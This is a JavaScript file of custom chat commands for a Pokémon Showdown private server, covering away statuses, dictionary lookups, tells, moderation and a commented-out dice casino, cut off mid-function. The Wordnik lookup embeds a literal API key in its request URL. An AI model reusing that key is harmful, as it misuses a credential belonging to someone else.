/**
 * Components
 * Created by CreaturePhil - https://github.com/CreaturePhil
 *
 * These are custom commands for the server. This is put in a seperate file
 * from commands.js and config/commands.js to not interfere with them.
 * In addition, it is easier to manage when put in a seperate file.
 * Most of these commands depend on core.js.
 *
 * Command categories: General, Staff, Server Management
 *
 * @license MIT license
 */

var fs = require("fs"),
    path = require("path"),
    http = require("http");

var request = require('request');

var bubbleLetterMap = new Map([
	['a', '\u24D0'], ['b', '\u24D1'], ['c', '\u24D2'], ['d', '\u24D3'], ['e', '\u24D4'], ['f', '\u24D5'], ['g', '\u24D6'], ['h', '\u24D7'], ['i', '\u24D8'], ['j', '\u24D9'], ['k', '\u24DA'], ['l', '\u24DB'], ['m', '\u24DC'],
	['n', '\u24DD'], ['o', '\u24DE'], ['p', '\u24DF'], ['q', '\u24E0'], ['r', '\u24E1'], ['s', '\u24E2'], ['t', '\u24E3'], ['u', '\u24E4'], ['v', '\u24E5'], ['w', '\u24E6'], ['x', '\u24E7'], ['y', '\u24E8'], ['z', '\u24E9'],
	['A', '\u24B6'], ['B', '\u24B7'], ['C', '\u24B8'], ['D', '\u24B9'], ['E', '\u24BA'], ['F', '\u24BB'], ['G', '\u24BC'], ['H', '\u24BD'], ['I', '\u24BE'], ['J', '\u24BF'], ['K', '\u24C0'], ['L', '\u24C1'], ['M', '\u24C2'],
	['N', '\u24C3'], ['O', '\u24C4'], ['P', '\u24C5'], ['Q', '\u24C6'], ['R', '\u24C7'], ['S', '\u24C8'], ['T', '\u24C9'], ['U', '\u24CA'], ['V', '\u24CB'], ['W', '\u24CC'], ['X', '\u24CD'], ['Y', '\u24CE'], ['Z', '\u24CF'],
	['1', '\u2460'], ['2', '\u2461'], ['3', '\u2462'], ['4', '\u2463'], ['5', '\u2464'], ['6', '\u2465'], ['7', '\u2466'], ['8', '\u2467'], ['9', '\u2468'], ['0', '\u24EA']
]);
var asciiMap = new Map([
	['\u24D0', 'a'], ['\u24D1', 'b'], ['\u24D2', 'c'], ['\u24D3', 'd'], ['\u24D4', 'e'], ['\u24D5', 'f'], ['\u24D6', 'g'], ['\u24D7', 'h'], ['\u24D8', 'i'], ['\u24D9', 'j'], ['\u24DA', 'k'], ['\u24DB', 'l'], ['\u24DC', 'm'],
	['\u24DD', 'n'], ['\u24DE', 'o'], ['\u24DF', 'p'], ['\u24E0', 'q'], ['\u24E1', 'r'], ['\u24E2', 's'], ['\u24E3', 't'], ['\u24E4', 'u'], ['\u24E5', 'v'], ['\u24E6', 'w'], ['\u24E7', 'x'], ['\u24E8', 'y'], ['\u24E9', 'z'],
	['\u24B6', 'A'], ['\u24B7', 'B'], ['\u24B8', 'C'], ['\u24B9', 'D'], ['\u24BA', 'E'], ['\u24BB', 'F'], ['\u24BC', 'G'], ['\u24BD', 'H'], ['\u24BE', 'I'], ['\u24BF', 'J'], ['\u24C0', 'K'], ['\u24C1', 'L'], ['\u24C2', 'M'],
	['\u24C3', 'N'], ['\u24C4', 'O'], ['\u24C5', 'P'], ['\u24C6', 'Q'], ['\u24C7', 'R'], ['\u24C8', 'S'], ['\u24C9', 'T'], ['\u24CA', 'U'], ['\u24CB', 'V'], ['\u24CC', 'W'], ['\u24CD', 'X'], ['\u24CE', 'Y'], ['\u24CF', 'Z'],
	['\u2460', '1'], ['\u2461', '2'], ['\u2462', '3'], ['\u2463', '4'], ['\u2464', '5'], ['\u2465', '6'], ['\u2466', '7'], ['\u2467', '8'], ['\u2468', '9'], ['\u24EA', '0']
]);

function parseStatus(text, encoding) {
	if (encoding) {
		text = text.split('').map(function (char) {
			return bubbleLetterMap.get(char);
		}).join('');
	} else {
		text = text.split('').map(function (char) {
			return asciiMap.get(char);
		}).join('');
	}
	return text;
}

try {
	var regdateCache = JSON.parse(fs.readFileSync('config/regdatecache.json', 'utf8'));
} catch (e) {
	var regdateCache = {};
}

try {
	var urbanCache = JSON.parse(fs.readFileSync('config/udcache.json', 'utf8'));
} catch (e) {
	var urbanCache = {};
}

function cacheUrbanWord (word, definition) {
	word = word.toLowerCase().replace(/ /g, '');
	urbanCache[word] = {"definition": definition, "time": Date.now()};
	fs.writeFile('config/urbancache.json', JSON.stringify(urbanCache));
}

function cacheRegdate (user, date) {
	regdateCache[toId(user)] = date;
	fs.writeFile('config/regdatecache.json', JSON.stringify(regdateCache));
}

var components = exports.components = {
	/*********************************************************
	 * General Commands
	 * These commands are usable by all users, and are standard private-server commands.
	 *********************************************************/
	 
 afk: function (target, room, user) {
		this.parse('/away AFK', room, user);
	},
	busy: function (target, room, user) {
		this.parse('/away BUSY', room, user);
	},
	work: function (target, room, user) {
		this.parse('/away WORK', room, user);
	},
	working: function (target, room, user) {
		this.parse('/away WORKING', room, user);
	},
	eating: function (target, room, user) {
		this.parse('/away EATING', room, user);
	},
	gaming: function (target, room, user) {
		this.parse('/away GAMING', room, user);
	},
	sleep: function (target, room, user) {
		this.parse('/away SLEEP', room, user);
	},
	sleeping: function (target, room, user) {
		this.parse('/away SLEEPING', room, user);
	},
	fap: function (target, room, user) {
		this.parse('/away FAP', room, user);
	},
	fapping: function (target, room, user) {
		this.parse('/away FAPPING', room, user);
	},
	nerd: function (target, room, user) {
		this.parse('/away NERD', room, user);
	},
	nerding: function (target, room, user) {
		this.parse('/away NERDING', room, user);
	},
	away: function (target, room, user) {
		if (!user.isAway && user.name.length > 15) return this.sendReply('Your username is too long for any kind of use of this command.');

		target = target ? target.replace(/[^a-zA-Z0-9]/g, '') : 'AWAY';
		var newName = user.name;
		var status = parseStatus(target, true);
		var statusLen = status.length;
		if (statusLen > 14) return this.sendReply('Your away status should be short and to-the-point, not a dissertation on why you are away.');

		if (user.isAway) {
			var statusIdx = newName.search(/\s\-\s[\u24B6-\u24E9\u2460-\u2468\u24EA]+$/);
			if (statusIdx > -1) newName = newName.substr(0, statusIdx);
			if (user.name.substr(-statusLen) === status) return this.sendReply('Your away status is already set to "' + target + '".');
		}

		newName += ' - ' + status;
		if (newName.length > 18) return this.sendReply('"' + target + '" is too long to use as your away status.');

		// forcerename any possible impersonators
		var targetUser = Users.getExact(user.userid + target);
		if (targetUser && targetUser !== user && targetUser.name === user.name + ' - ' + target) {
			targetUser.resetName();
			targetUser.send('|nametaken||Your name conflicts with ' + user.name + (user.name.substr(-1) === 's' ? '\'' : '\'s') + ' new away status.');
		}

		if (user.can('lock', null, room)) this.add('|raw|-- <font color="' + Core.hashColor(user.userid) + '"><strong>' + Tools.escapeHTML(user.name) + '</strong></font> is now ' + target.toLowerCase() + '.');
		user.forceRename(newName, user.registered);
		user.updateIdentity();
		user.isAway = true;
	},

	back: function (target, room, user) {
		if (!user.isAway) return this.sendReply('You are not set as away.');
		user.isAway = false;

		var newName = user.name;
		var statusIdx = newName.search(/\s\-\s[\u24B6-\u24E9\u2460-\u2468\u24EA]+$/);
		if (statusIdx < 0) {
			user.isAway = false;
			if (user.can('lock', null, room)) this.add('|raw|-- <font color="' + Core.hashColor(user.userid) + '"><strong>' + Tools.escapeHTML(user.name) + '</strong></font> is no longer away.');
			return false;
		}

		var status = parseStatus(newName.substr(statusIdx + 3), false);
		newName = newName.substr(0, statusIdx);
		user.forceRename(newName, user.registered);
		user.updateIdentity();
		user.isAway = false;
		if (user.can('lock', null, room)) this.add('|raw|-- <font color="' + Core.hashColor(user.userid) + '"><strong>' + Tools.escapeHTML(newName) + '</strong></font> is no longer ' + status.toLowerCase() + '.');
	},
	
	earnbuck: 'earnmoney',
	earnbucks: 'earnmoney',
	earnhalo: 'earnmoney',
	earnhalos: 'earnmoney',
	earnmoney: function (target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('<strong><u>Ways to earn money:</u></strong><br /><br /><ul><li>Win tournaments in offcial rooms<u></u></li><li>Play dice games in the Casino.</li></ul>');
	},
	
	regdate: function(target, room, user, connection) {
	        if (!this.canBroadcast()) return;
		if (!target || target == "0") return this.sendReply('Lol, you can\'t do that, you nub.');
		if (!target || target == "." || target == "," || target == "'") return this.sendReply('/regdate - Please specify a valid username.'); //temp fix for symbols that break the command
		var username = target;
		target = target.replace(/\s+/g, '');
		var request = require("request");
		var self = this;

		request('http://pokemonshowdown.com/users/~' + target, function (error, response, content) {
			if (!(!error && response.statusCode == 200)) return;
			content = content + '';
			content = content.split("<em");
			if (content[1]) {
				content = content[1].split("</p>");
				if (content[0]) {
					content = content[0].split("</em>");
					if (content[1]) {
						regdate = content[1].split('</small>')[0] + '.';
						data = Tools.escapeHTML(username) + ' was registered on' + regdate;
					}
				}
			} else {
				data = Tools.escapeHTML(username) + ' is not registered.';
			}
			self.sendReplyBox(Tools.escapeHTML(data));
		});
	},

/*	atm: 'profile',
	wallet: 'profile',
	profile: function (target, room, user, connection, cmd) {
		if (!this.canBroadcast()) return;
		if (target.length >= 19) return this.sendReply('Usernames are required to be less than 19 characters long.');

		var targetUser = this.targetUserOrSelf(target);

		if (!targetUser) {
			var userId = toId(target);
			var money = Core.profile.money(userId);
			var elo = Core.profile.tournamentElo(userId);
			var about = Core.profile.about(userId);

			if (elo === 1000 && about === 0) {
				return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, userId) + Core.profile.group(false, userId) + Core.profile.lastSeen(false, userId) + Core.profile.display('money', money) + '<br clear="all">');
			}
			if (elo === 1000) {
				return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, userId) + Core.profile.group(false, userId) + Core.profile.display('about', about) + Core.profile.lastSeen(false, userId) + Core.profile.display('money', money) + '<br clear="all">');
			}
			if (about === 0) {
				return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, userId) + Core.profile.group(false, userId) + Core.profile.lastSeen(false, userId) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(userId)) + '<br clear="all">');
			}
			return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, target) + Core.profile.group(false, userId) + Core.profile.display('about', about) + Core.profile.lastSeen(false, userId) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(userId)) + '<br clear="all">');
		}

		var money = Core.profile.money(targetUser.userid);
		var elo = Core.profile.tournamentElo(toId(targetUser.userid));
		var about = Core.profile.about(targetUser.userid);

		if (elo === 1000 && about === 0) {
			return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + '<br clear="all">');
		}
		if (elo === 1000) {
			return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('about', about) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + '<br clear="all">');
		}
		if (about === 0) {
			return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(targetUser.userid)) + '<br clear="all">');
		}
		return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('about', about) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(targetUser.userid)) + '<br clear="all">');	
		
	}, */

	setabout: 'about',
	about: function (target, room, user) {
		if (!target) return this.parse('/help about');
		if (target.length > 30) return this.sendReply('About cannot be over 30 characters.');

		var now = Date.now();

		if ((now - user.lastAbout) * 0.001 < 30) {
			this.sendReply('|raw|<strong class=\"message-throttle-notice\">Your message was not sent because you\'ve been typing too quickly. You must wait ' + Math.floor(
				(30 - (now - user.lastAbout) * 0.001)) + ' seconds</strong>');
			return;
		}

		user.lastAbout = now;

		target = Tools.escapeHTML(target);
		target = target.replace(/[^A-Za-z\d ]+/g, '');

		var data = Core.stdin('about', user.userid);
		if (data === target) return this.sendReply('This about is the same as your current one.');

		Core.stdout('about', user.userid, target);

		this.sendReply('Your about is now: "' + target + '"');
	},

	tourladder: 'tournamentladder',
	tournamentladder: function (target, room, user) {
		if (!this.canBroadcast()) return;

		if (!target) target = 10;
		if (!/[0-9]/.test(target) && target.toLowerCase() !== 'all') target = -1;

		var ladder = Core.ladder(Number(target));
		if (ladder === 0) return this.sendReply('No one is ranked yet.');

		return this.sendReply('|raw|<center>' + ladder + 'To view the entire ladder use /tourladder <em>all</em> or to view a certain amount of users use /tourladder <em>number</em></center>');
	},
	
	tell: function (target, room, user) {
		if (!target) return;
		var message = this.splitTarget(target);
		if (!message) return this.sendReply("You forgot the comma.");
		if (user.locked) return this.sendReply("You cannot use this command while locked.");

		message = this.canTalk(message, null);
		if (!message) return this.parse('/help tell');

		if (!global.tells) global.tells = {};
		if (!tells[toId(this.targetUsername)]) tells[toId(this.targetUsername)] = [];
		if (tells[toId(this.targetUsername)].length > 5) return this.sendReply("User " + this.targetUsername + " has too many tells queued.");

		tells[toId(this.targetUsername)].push(Date().toLocaleString() + " - " + user.getIdentity() + " said: " + message);
		return this.sendReply("Message \"" + message + "\" sent to " + this.targetUsername + ".");
	},

	emoticons: 'emoticon',
	emoticon: function (target, room, user) {
		if (!this.canBroadcast()) return;
		var name = Object.keys(Core.emoticons),
			emoticons = [];
		var len = name.length;
		while (len--) {
			emoticons.push((Core.processEmoticons(name[(name.length - 1) - len]) + '&nbsp;' + name[(name.length - 1) - len]));
		}
		this.sendReplyBox('<b><u>List of emoticons:</b></u> <br/><br/>' + emoticons.join(' ').toString() + '<br/><b>Please not that Emoticons are currently disabled.</b>');
	},
		
	viewtells: 'showtells',
	showtells: function (target, room, user) {
		return this.sendReply("These users have currently have queued tells: " + Object.keys(tells));
	},

	urand: 'ud',
	udrand: 'ud',
	u: 'ud',
	ud: function(target, room, user, connection, cmd) {
		if (!target) {
			var target = '';
			var random = true;
		} else {
			var random = false;
		}
		if (target.toString().length > 50) return this.sendReply('/ud - <phrase> can not be longer than 50 characters.');
		if (!this.canBroadcast()) return;
		if (user.userid === 'roseybear' && this.broadcasting) return this.sendReply('lol nope');

		if (!random) {
			options = {
			    url: 'http://www.urbandictionary.com/iphone/search/define',
			    term: target,
			    headers: {
  			    	'Referer': 'http://m.urbandictionary.com'
   	 			},
		    	qs: {
		   	 		'term': target
   		 		}
			};
		} else {
			options = {
			    url: 'http://www.urbandictionary.com/iphone/search/random',
			    headers: {
  			    	'Referer': 'http://m.urbandictionary.com'
   	 			},
			};
		}

		var milliseconds = ((44640 * 60) * 1000);

		if (urbanCache[target.toLowerCase().replace(/ /g, '')] && Math.round(Math.abs((urbanCache[target.toLowerCase().replace(/ /g, '')].time - Date.now())/(24*60*60*1000))) < 31) {
			return this.sendReplyBox("<b>" + Tools.escapeHTML(target) + ":</b> " + urbanCache[target.toLowerCase().replace(/ /g, '')].definition.substr(0,400));
		}

		self = this;

		function callback(error, response, body) {
		    if (!error && response.statusCode == 200) {
		        page = JSON.parse(body);
		        definitions = page['list'];
		        if (page['result_type'] == 'no_results') {
		        	self.sendReplyBox('No results for <b>"' + Tools.escapeHTML(target) + '"</b>.');
		        	return room.update();
		        } else {
		        	if (!definitions[0]['word'] || !definitions[0]['definition']) {
		        		self.sendReplyBox('No results for <b>"' + Tools.escapeHTML(target) + '"</b>.');
		        		return room.update();
		        	}
		        	output = '<b>' + Tools.escapeHTML(definitions[0]['word']) + ':</b> ' + Tools.escapeHTML(definitions[0]['definition']).replace(/\r\n/g, '<br />').replace(/\n/g, ' ');
		        	if (output.length > 400) output = output.slice(0,400) + '...';
		        	cacheUrbanWord(target, Tools.escapeHTML(definitions[0]['definition']).replace(/\r\n/g, '<br />').replace(/\n/g, ' '));
		        	self.sendReplyBox(output);
		        	return room.update();
		        }
		    }
		}
		request(options, callback);
	},

	def: 'define',
	define: function(target, room, user) {
		if (!target) return this.sendReply('Usage: /define <word>');
		target = toId(target);
		if (target > 50) return this.sendReply('/define <word> - word can not be longer than 50 characters.');
		if (!this.canBroadcast()) return;

		var options = {
		    url: 'http://api.wordnik.com:80/v4/word.json/'+target+'/definitions?limit=3&sourceDictionaries=all' +
		    '&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5',
		};

		var self = this;

		function callback(error, response, body) {
		    if (!error && response.statusCode == 200) {
		        var page = JSON.parse(body);
		        var output = '<font color=#24678d><b>Definitions for ' + target + ':</b></font><br />';
		        if (!page[0]) {
		        	self.sendReplyBox('No results for <b>"' + target + '"</b>.');
		        	return room.update();
		        } else {
		        	var count = 1;
		        	for (var u in page) {
		        		if (count > 3) break;
		        		output += '(<b>'+count+'</b>) ' + Tools.escapeHTML(page[u]['text']) + '<br />';
		        		count++;
		        	}
		        	self.sendReplyBox(output);
		        	return room.update();
		        }
		    }
		}
		request(options, callback);
	},
	
	/*********************************************************
	 * Moderation Commands
	 *********************************************************/

	clearall: function (target, room, user) {
		if (!this.can('clearall')) return;
		if (room.battle) return this.sendReply('You cannot do it on battle rooms.');

		var len = room.log.length,
			users = [];
		while (len--) {
			room.log[len] = '';
		}
		for (var user in room.users) {
			users.push(user);
			Users.get(user).leaveRoom(room, Users.get(user).connections[0]);
		}
		len = users.length;
		setTimeout(function () {
			while (len--) {
				Users.get(users[len]).joinRoom(room, Users.get(users[len]).connections[0]);
			}
		}, 1000);
	},
	
	spam: 'spamroom',
	spamroom: function (target, room, user) {
		if (!target) return this.sendReply("Please specify a user.");
		this.splitTarget(target);

		if (!this.targetUser) {
			return this.sendReply("The user '" + this.targetUsername + "' does not exist.");
		}
		if (!this.can('mute', this.targetUser)) {
			return false;
		}

		var targets = Spamroom.addUser(this.targetUser);
		if (targets.length === 0) {
			return this.sendReply("That user's messages are already being redirected to the spamroom.");
		}
		this.privateModCommand("(" + user.name + " has added to the spamroom user list: " + targets.join(", ") + ")");
	},

	unspam: 'unspamroom',
	unspamroom: function (target, room, user) {
		if (!target) return this.sendReply("Please specify a user.");
		this.splitTarget(target);

		if (!this.can('mute')) {
			return false;
		}

		var targets = Spamroom.removeUser(this.targetUser || this.targetUsername);
		if (targets.length === 0) {
			return this.sendReply("That user is not in the spamroom list.");
		}
		this.privateModCommand("(" + user.name + " has removed from the spamroom user list: " + targets.join(", ") + ")");
	},

	/*********************************************************
	 * Economy and Casino Commands
	 * The commands which control Nimbus' currency system, Halos.
	 *********************************************************/
	/* 
	shop: function (target, room, user) {
		if (!this.canBroadcast()) return;
		return this.sendReply('|raw|' + Core.shop(true));
	},

	buy: function (target, room, user) {
		if (!target) this.parse('/help buy');
		var userMoney = Number(Core.stdin('money', user.userid));
		var shop = Core.shop(false);
		var len = shop.length;
		while (len--) {
			if (target.toLowerCase() === shop[len][0].toLowerCase()) {
				var price = shop[len][2];
				if (price > userMoney) return this.sendReply('You don\'t have enough halos for this. You need ' + (price - userMoney) + ' more bucks to buy ' + target + '.');
				Core.stdout('money', user.userid, (userMoney - price));
				if (target.toLowerCase() === 'symbol') {
					user.canCustomSymbol = true;
					this.sendReply('You have purchased a custom symbol. You will have this until you log off for more than an hour. You may now use /customsymbol to set your symbol now.');
					this.parse('/help customsymbol');
					this.sendReply('If you do not want your custom symbol anymore, you may use /resetsymbol to go back to your old symbol.');
				} else {
					this.sendReply('You have purchased ' + target + '. Please contact an admin to get ' + target + '.');
					for (var u in Users.users) {
						if (Users.get(u).group === '~') Users.get(u).send('|pm|' + user.group + user.name + '|' + Users.get(u).group + Users.get(u).name + '|' + 'I have bought ' + target + ' from the shop.');
					}
				}
				room.add(user.name + ' has bought ' + target + ' from the shop.');
			}
		}
	},
	
	dicerules: 'dicecommands',
	dicehelp: 'dicecommands',
	dicecommands: function (target, room, user) {
		if (!this.canBroadcast()) return;
		return this.sendReplyBox('<u><font size = 2><center>Dice rules and commands</center></font></u><br />' +
			'<b>/dicegame OR /diceon [amount]</b> - Starts a dice game in the room for the specified amount of bucks. Must be ranked + or higher to use.<br />' +
			'<b>/play</b> - Joins the game of dice. You must have more or the same number of bucks the game is for. Winning a game wins you the amount of bucks the game is for. Losing the game removes that amount from you.<br />' +
			'<b>/diceend</b> - Ends the current game of dice in the room. You must be ranked + or higher to use this.');
	},

	startdice: 'diceon',
	dicegame: 'diceon',
	diceon: function (target, room, user, connection, cmd) {
		if (!this.can('broadcast', null, room)) return this.sendReply('You must be ranked + or higher to be able to start a game of dice.');
		if (room.dice) {
			return this.sendReply('There is already a dice game going on');
		}
		target = toId(target);
		if (!target) return this.sendReply('/' + cmd + ' [amount] - Starts a dice game. The specified amount will be the amount of cash betted for.');
		if (isNaN(target)) return this.sendReply('That isn\'t a number, smartass.');
		if (target < 1) return this.sendReply('You cannot start a game for anything less than 1 buck.');
		room.dice = {};
		room.dice.members = [];
		room.dice.award = parseInt(target);
		var point = (target == 1) ? 'buck' : 'bucks';
		this.add('|html|<div class="infobox"><font color = #007cc9><center><h2>' + user.name + ' has started a dice game for <font color = green>' + room.dice.award + '</font color> ' + point + '!<br />' +
			'<center><button name="send" value="/play" target="_blank">Click to join!</button>');
	},

	play: function (target, room, user, connection, cmd) {
		if (!room.dice) {
			return this.sendReply('There is no dice game going on now');
		}
		if (parseInt(Core.stdin('money', user.userid)) < room.dice.award) {
			return this.sendReply("You don't have enough money to join this game of dice.");
		}
		for (var i = 0; i < room.dice.members.length; i++) {
			if (Users.get(room.dice.members[i]).userid == user.userid) return this.sendReply("You have already joined this game of dice!");
		}
		room.dice.members.push(user.userid);
		this.add('|html|<b>' + user.name + ' has joined the game!');
		if (room.dice.members.length == 2) {
			var point = (room.dice.award == 1) ? 'buck' : 'bucks';
			result1 = Math.floor((Math.random() * 6) + 1);
			result2 = Math.floor((Math.random() * 6) + 1);
			var result3 = '';
			var losemessage = '';
			if (result1 > result2) {
				result3 += '' + Users.get(room.dice.members[0]).name + ' has won ' + room.dice.award + ' ' + point + '!';
				losemessage += 'Better luck next time, ' + Users.get(room.dice.members[1]).name + '!';
			} else if (result2 > result1) {
				result3 += '' + Users.get(room.dice.members[1]).name + ' has won ' + room.dice.award + ' ' + point + '!';
				losemessage += 'Better luck next time, ' + Users.get(room.dice.members[0]).name + '!';
			} else {
				do {
					result1 = Math.floor((Math.random() * 6) + 1);
					result2 = Math.floor((Math.random() * 6) + 1);
				} while (result1 === result2);
				if (result1 > result2) {
					result3 += '' + Users.get(room.dice.members[0]).name + ' has won ' + room.dice.award + ' ' + point + '!';
					losemessage += 'Better luck next time, ' + Users.get(room.dice.members[1]).name + '!';
				} else {
					result3 += '' + Users.get(room.dice.members[1]).name + ' has won ' + room.dice.award + ' ' + point + '!';
					losemessage += 'Better luck next time, ' + Users.get(room.dice.members[0]).name + '!';
				}
			}
			var dice1, dice2;
			switch (result1) {
			case 1:
				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/1_zps4bef0fe2.png";
				break;
			case 2:
				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/2_zpsa0efaac0.png";
				break;
			case 3:
				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/3_zps36d44175.png";
				break;
			case 4:
				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/4_zpsd3983524.png";
				break;
			case 5:
				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/5_zpsc9bc5572.png";
				break;
			case 6:
				dice1 = "http://i1171.photobucket.com/albums/r545/Brahak/6_zps05c8b6f5.png";
				break;
			}

			switch (result2) {
			case 1:
				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/1_zps4bef0fe2.png";
				break;
			case 2:
				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/2_zpsa0efaac0.png";
				break;
			case 3:
				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/3_zps36d44175.png";
				break;
			case 4:
				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/4_zpsd3983524.png";
				break;
			case 5:
				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/5_zpsc9bc5572.png";
				break;
			case 6:
				dice2 = "http://i1171.photobucket.com/albums/r545/Brahak/6_zps05c8b6f5.png";
				break;
			}

			room.add('|html|<div class="infobox"><center><b>The dice game has been started!</b><br />' +
				 'Two users have joined the game.<br />' +
				 'Rolling the dice...<br />' +
				 '<img src = "' + dice1 + '" align = "left"><img src = "' + dice2 + '" align = "right"><br/>' +
				 '<b>' + Users.get(room.dice.members[0]).name + '</b> rolled ' + result1 + '!<br />' +
				 '<b>' + Users.get(room.dice.members[1]).name + '</b> rolled ' + result2 + '!<br />' +
				 '<b>' + result3 + '</b><br />' + losemessage);

			var user1 = Core.stdin('money', Users.get(room.dice.members[0]).userid);
			var user2 = Core.stdin('money', Users.get(room.dice.members[1]).userid);

			if (result3 === '' + Users.get(room.dice.members[0]).name + ' has won ' + room.dice.award + ' ' + point + '!') {
				var userMoney = parseInt(user1) + parseInt(room.dice.award);
				var targetMoney = parseInt(user2) - parseInt(room.dice.award);
				var loser = Users.get(room.dice.members[1]).userid;
				Core.stdout('money', Users.get(room.dice.members[0]).userid, userMoney, function () {
					Core.stdout('money', loser, targetMoney);
				});
			} else {
				var userMoney = parseInt(user1) - parseInt(room.dice.award);
				var targetMoney = parseInt(user2) + parseInt(room.dice.award);
				var winner = Users.get(room.dice.members[1]).userid;
				Core.stdout('money', Users.get(room.dice.members[0]).userid, userMoney, function () {
					Core.stdout('money', winner, targetMoney);
				});
			}
			delete room.dice;
		}
	},

	diceend: function (target, room, user) {
		if (!this.can('broadcast', null, room)) return false;
		if (!room.dice) return this.sendReply("There is no game of dice going on in this room right now."); this.add('|html|<b>The game of dice has been ended by ' + user.name); delete room.dice;
	},


	transferbuck: 'transfermoney',
	transferhalo: 'transfermoney',
	transferhalos: 'transfermoney',
	transferbucks: 'transfermoney',
	transfermoney: function (target, room, user) {
		if (!target) return this.parse('/help transfermoney');
		if (!this.canTalk()) return;

		if (target.indexOf(',') >= 0) {
			var parts = target.split(',');
			parts[0] = this.splitTarget(parts[0]);
			var targetUser = this.targetUser;
		}

		if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
		if (targetUser.userid === user.userid) return this.sendReply('You cannot transfer halos to yourself.');
		if (isNaN(parts[1])) return this.sendReply('Very funny, now use a real number.');
		if (parts[1] < 1) return this.sendReply('You can\'t transfer less than one halo at a time.');
		if (String(parts[1]).indexOf('.') >= 0) return this.sendReply('You cannot transfer halos with decimals.');

		var userMoney = Core.stdin('money', user.userid);
		var targetMoney = Core.stdin('money', targetUser.userid);

		if (parts[1] > Number(userMoney)) return this.sendReply('You cannot transfer more halos than what you have.');

		var b = 'halos';
		var cleanedUp = parts[1].trim();
		var transferMoney = Number(cleanedUp);
		if (transferMoney === 1) b = 'halo';

		userMoney = Number(userMoney) - transferMoney;
		targetMoney = Number(targetMoney) + transferMoney;

		Core.stdout('money', user.userid, userMoney, function () {
			Core.stdout('money', targetUser.userid, targetMoney);
		});

		this.sendReply('You have successfully transferred ' + transferMoney + ' ' + b + ' to ' + targetUser.name + '. You now have ' + userMoney + ' bucks.');
		targetUser.send(user.name + ' has transferred ' + transferMoney + ' ' + b + ' to you. You now have ' + targetMoney + ' bucks.');
	}, */

	customsymbol: function (target, room, user) {
		if (!user.canCustomSymbol && !user.can('vip')) return this.sendReply('You need to buy this item from the shop to use.');
		if (!target || target.length > 1) return this.parse('/help customsymbol');
		//if (target.match(/[A-Za-z\d]+/g) || 'â€½!+%@\u2605\u2606&~#'.indexOf(target) >= 0) return this.sendReply('Sorry, but you cannot change your symbol to this for safety/stability reasons.');
		var bannedSymbols = /[ +<>$%‽!★@&~#卐|A-z0-9]/;
		if (target.match(bannedSymbols)) return this.sendReply('Sorry, but you cannot change your symbol to this for safety/stability reasons.');
		user.getIdentity = function (roomid) {
			if (!roomid) roomid = 'lobby';
			var name = this.name + (this.away ? " - \u0410\u051d\u0430\u0443" : "");
			if (this.locked) {
				return '‽' + name;
			}
			if (this.mutedRooms[roomid]) {
				return '!' + name;
			}
			var room = Rooms.rooms[roomid];
			if (room.auth) {
				if (room.auth[this.userid]) {
					return room.auth[this.userid] + name;
				}
				if (room.isPrivate) return ' ' + name;
			}
			return target + name;
		};
		user.updateIdentity();
		user.canCustomSymbol = false;
		user.hasCustomSymbol = true;
	},

	resetsymbol: function (target, room, user) {
		if (!user.hasCustomSymbol) return this.sendReply('You don\'t have a custom symbol.');
		user.getIdentity = function (roomid) {
			if (!roomid) roomid = 'lobby';
			var name = this.name + (this.away ? " - \u0410\u051d\u0430\u0443" : "");
			if (this.locked) {
				return 'â€½' + name;
			}
			if (this.mutedRooms[roomid]) {
				return '!' + name;
			}
			var room = Rooms.rooms[roomid];
			if (room.auth) {
				if (room.auth[this.userid]) {
					return room.auth[this.userid] + name;
				}
				if (room.isPrivate) return ' ' + name;
			}
			return this.group + name;
		};
		user.hasCustomSymbol = false;
		user.updateIdentity();
		this.sendReply('Your symbol has been reset.');
	},

/*
	givebuck: 'givemoney',
	givebucks: 'givemoney',
	givemoney: function (target, room, user) {
		if (!user.can('givemoney')) return;
		if (!target) return this.parse('/help givemoney');

		if (target.indexOf(',') >= 0) {
			var parts = target.split(',');
			parts[0] = this.splitTarget(parts[0]);
			var targetUser = this.targetUser;
		}

		if (!targetUser) return this.sendReply('User ' + this.targetUsername + ' not found.');
		if (isNaN(parts[1])) return this.sendReply('Very funny, now use a real number.');
		if (parts[1] < 1) return this.sendReply('You can\'t give less than one buck at a time.');
		if (String(parts[1]).indexOf('.') >= 0) return this.sendReply('You cannot give money with decimals.');

		var b = 'bucks';
		var cleanedUp = parts[1].trim();
		var giveMoney = Number(cleanedUp);
		if (giveMoney === 1) b = 'buck';

